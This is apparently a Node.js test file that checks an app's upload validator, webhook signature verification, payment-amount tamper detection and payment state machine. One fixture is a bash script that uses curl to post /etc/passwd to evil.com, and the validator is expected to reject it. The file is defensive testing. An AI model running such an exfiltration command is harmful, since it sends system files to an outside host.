import test from "node:test";
import assert from "node:assert/strict";
import crypto from "node:crypto";
import { validateFileSignature } from "../../src/utils/resumeStorage.mjs";
import {
  verifyRazorpayWebhookSignature,
  verifyStripeWebhookSignature,
  assertAmountIntegrity,
  AmountTamperingError,
} from "../../src/utils/paymentSecurity.mjs";
import {
  PaymentStatus,
  validateStateTransition,
  IllegalPaymentTransitionError,
} from "../../src/utils/paymentStateMachine.mjs";

// ============================================================================
// 1. File Upload Abuse Prevention (Magic Bytes & Size Enforcement)
// ============================================================================

test("Security: rejects Windows PE executable (.exe) disguised as .pdf", () => {
  const exeDisguised = Buffer.concat([
    Buffer.from([0x4d, 0x5a, 0x90, 0x00]), // MZ executable header
    Buffer.from("malicious_trojan_payload.bin"),
  ]);
  const result = validateFileSignature(exeDisguised);
  assert.equal(result.valid, false);
  assert.match(result.error || "", /Invalid file format signature/);
});

test("Security: rejects Bash script or HTML disguised as .pdf", () => {
  const bashDisguised = Buffer.from("#!/bin/bash\ncurl -X POST https://evil.com/exfil --data @/etc/passwd");
  const result = validateFileSignature(bashDisguised);
  assert.equal(result.valid, false);
});

test("Security: enforces strict 5 MB file size limit", () => {
  const oversizedBuffer = Buffer.alloc(5 * 1024 * 1024 + 1024, 0x25); // > 5MB
  const result = validateFileSignature(oversizedBuffer);
  assert.equal(result.valid, false);
  assert.match(result.error || "", /exceeds maximum size/);
});

// ============================================================================
// 2. Webhook Forgery & Tamper Resistance
// ============================================================================

test("Security: rejects forged Razorpay signature header", () => {
  const secret = "secret_key_123";
  const rawBody = JSON.stringify({ event: "payment.captured", amount: 2400000 });
  const forgedSig = "forged_hex_signature_not_matching_hmac";

  assert.equal(
    verifyRazorpayWebhookSignature(rawBody, forgedSig, secret),
    false,
    "Forged signature must fail"
  );
});

test("Security: detects and throws on payment amount tampering attempt", () => {
  assert.throws(
    () => {
      assertAmountIntegrity(2400000, 100, "order_tamper_attempt");
    },
    (err) => {
      assert.ok(err instanceof AmountTamperingError);
      assert.equal(err.code, "AMOUNT_TAMPERED");
      return true;
    }
  );
});

// ============================================================================
// 3. Payment State Machine: Illegal Transition Rejection
// ============================================================================

test("Security: state machine strictly rejects illegal or out-of-order state transitions", () => {
  // FAILED cannot jump to PAID
  assert.throws(
    () => {
      validateStateTransition(PaymentStatus.FAILED, PaymentStatus.PAID, "order_01");
    },
    (err) => {
      assert.ok(err instanceof IllegalPaymentTransitionError);
      return true;
    }
  );

  // REFUNDED cannot jump to PAID
  assert.throws(
    () => {
      validateStateTransition(PaymentStatus.REFUNDED, PaymentStatus.PAID, "order_02");
    },
    (err) => {
      assert.ok(err instanceof IllegalPaymentTransitionError);
      return true;
    }
  );
});
